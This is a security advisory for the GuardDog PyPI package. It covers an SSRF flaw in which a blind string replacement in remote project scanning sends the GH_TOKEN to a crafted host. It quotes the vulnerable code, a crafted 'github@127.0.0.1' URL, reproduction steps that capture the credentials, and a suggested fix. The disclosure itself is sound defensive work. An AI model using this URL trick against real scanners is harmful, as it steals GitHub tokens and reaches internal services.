# [H] GuardDog has a blind GitHub URL rewrite in remote project scanning causes SSRF and `GH_TOKEN` exfiltration

## Summary
Severity: High
Advisory: GHSA-587r-mc96-6f2p
CVE: CVE-2026-44971
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-587r-mc96-6f2p
Type: github-advisory

## Affected
- PyPI: `guarddog` — affected >=1.0.0

## Details
# Summary
The programmatic remote project scanning path rewrites attacker-controlled repository URLs using a blind string replacement and then sends the caller's GitHub credentials with the resulting request. This allows an attacker who can influence the scanned repository URL to trigger SSRF and capture the `GH_TOKEN` used by GuardDog.

# Description
`ProjectScanner.scan_remote()` takes a `url`, `branch`, and `requirements_name`, then constructs a raw GitHub URL by calling:

```python
githubusercontent_url = url.replace("github", "raw.githubusercontent")
req_url = f"{githubusercontent_url}/{branch}/{requirements_name}"
resp = requests.get(url=req_url, auth=token)
```

Because this logic does not parse or validate the hostname, a crafted URL such as:

```text
http://github@127.0.0.1:18081/owner/repo
```

is transformed into:

```text
http://raw.githubusercontent@127.0.0.1:18081/owner/repo/main/requirements.txt
```

Requests interprets this as an HTTP request to `127.0.0.1:18081`, and GuardDog includes the configured GitHub credentials via HTTP Basic Auth.

# Reproduction summary
1. Start an HTTP listener on `127.0.0.1:18081` that logs the request path and `Authorization` header.
2. Set `GIT_USERNAME=alice` and `GH_TOKEN=supersecret`.
3. Call `PypiRequirementsScanner().scan_remote("http://github@127.0.0.1:18081/owner/repo", "main", "requirements.txt")`.
4. Observe a request to `/owner/repo/main/requirements.txt` with `Authorization: Basic YWxpY2U6c3VwZXJzZWNyZXQ=`.

# Key code paths
- `guarddog/scanners/scanner.py:361-365`

# Practical impact
This can expose repository-scanning infrastructure to:
- theft of the GitHub PAT configured in `GH_TOKEN`
- SSRF to internal or localhost services reachable by the scanner
- attacker-controlled dependency file content returned by the malicious endpoint

# Prior public disclosure check
As of 2026-03-18, no matching public GitHub advisory, CVE, or public repo issue was found for this specific bug.

# Suggested fix
Parse the input URL, require `hostname == "github.com"`, validate the path shape (`owner/repo`), build the raw URL from parsed components instead of string replacement, and never send GitHub credentials to non-GitHub hosts.

## References
- https://github.com/DataDog/guarddog/security/advisories/GHSA-587r-mc96-6f2p
- https://nvd.nist.gov/vuln/detail/CVE-2026-44971
- https://github.com/DataDog/guarddog
